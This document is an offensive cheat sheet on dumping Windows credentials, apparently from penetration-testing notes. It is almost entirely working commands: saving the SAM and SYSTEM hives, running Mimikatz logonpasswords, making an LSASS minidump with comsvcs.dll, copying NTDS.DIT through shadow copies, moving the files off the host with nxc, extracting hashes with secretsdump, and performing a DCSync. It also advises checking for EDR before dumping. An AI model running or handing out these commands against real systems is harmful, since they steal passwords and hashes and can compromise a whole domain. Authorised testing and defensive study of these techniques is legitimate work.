# Windows Credential Dumping

!!! tip "Tip"
    If you have local admin but LSASS is protected, dump SAM/SYSTEM offline: `reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak` then `impacket-secretsdump -sam sam.bak -system system.bak LOCAL`.

!!! warning "Watch out"
    LSASS dumps trigger EDR on most enterprise endpoints. Check for AV/EDR first with `tasklist` — look for CrowdStrike, SentinelOne, Defender, Carbon Black processes.

---

## Dump SAM Database

```powershell
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

Extract NTLM hashes:

```bash
pypykatz registry --sam sam system
```

---

## Dump LSASS with Mimikatz

```powershell
.\mimikatz.exe
```

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### LSASS Minidump for Offline Analysis

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe comsvcs.dll, MiniDump 1234 C:\Temp\lsass.dmp full
```

Parse offline:

```bash
pypykatz lsa minidump lsass.dmp
```

---

## Dump NTDS.DIT (Domain Controller)

### Via Shadow Copy

```powershell
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit C:\Temp\ntds.dit
reg save hklm\system C:\Temp\system
```

### Via File System Copy

```bash
copy C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

Transfer files:

```bash
nxc smb 10.10.10.10 -u <user> -p <pass> --exec "get \\C$\Temp\ntds.dit ./ntds.dit"
nxc smb 10.10.10.10 -u <user> -p <pass> --exec "get \\C$\Temp\SYSTEM ./SYSTEM"
```

### Extract Hashes with secretsdump

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

---

## DCSync Attack

```mimikatz
lsadump::dcsync /domain:corp.com /user:Administrator
```

Output:

```
NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```
